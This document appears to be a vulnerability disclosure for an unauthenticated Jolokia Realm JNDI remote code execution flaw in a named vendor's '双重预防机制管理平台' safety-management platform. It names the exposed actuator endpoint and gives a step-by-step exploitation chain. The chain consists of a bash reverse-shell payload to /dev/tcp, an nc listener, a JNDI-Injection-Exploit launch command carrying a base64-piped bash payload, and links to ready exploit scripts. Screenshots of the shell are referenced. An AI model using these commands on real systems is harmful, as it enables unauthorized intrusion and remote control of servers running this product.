[PRODUCT]

双重预防机制管理平台
Website：https://www.hairongtec.com/about?lang=en
<img width="1987" height="833" alt="图片" src="https://github.com/user-attachments/assets/4cca9d4a-9757-46a4-a144-6f0c3bf471a2" />

 
[TYPE]

RCE

[DESCRIPTION]

A jolokia Realm JNDI RCE vulnerability exists in the " 双重预防机制管理平台". This vulnerability can be triggered without authentication and lead to system privilege escalation, posing significant risks.

[DETAILS]

The system's API 'api/prevention/actuator/jolokia/list' exposes sensitive information
 <img width="2561" height="1367" alt="图片" src="https://github.com/user-attachments/assets/ecb65828-6592-46f2-8a79-16ca747f0dff" />

1.	Detected Jolokia Realm JNDI RCE vulnerability

2.	Reverse shell payload:
bash -c 'exec bash -i &>/dev/tcp/ip/port <&1'

3.	Listener command:
nc -lnvp port

4.	Exploit tool:
https://github.com/Zard-ethan/JNDI-Injection-Exploit-1.0-SNAPSHOT-all

5.	Payload encoding reference:
https://www.jackson-t.ca/runtime-exec-payloads.html
6.	start：java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,ZGly}|{base64,-d}|{bash,-i}" -A ip
7.	use exp：https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py

 [RESULTS]
 
 use springboot-realm-jndi-rce.py 
 <img width="1967" height="413" alt="图片" src="https://github.com/user-attachments/assets/4aab938a-ee2d-44e6-937f-279026b7ab0d" />
the JNDI Service
<img width="1979" height="205" alt="图片" src="https://github.com/user-attachments/assets/7fd5fd6b-d760-4c70-8686-61dd6b6dec2f" />

Reverse shell 
<img width="1985" height="1103" alt="图片" src="https://github.com/user-attachments/assets/7bfc339d-9247-4035-9434-ac3ce83caa22" />


 
 
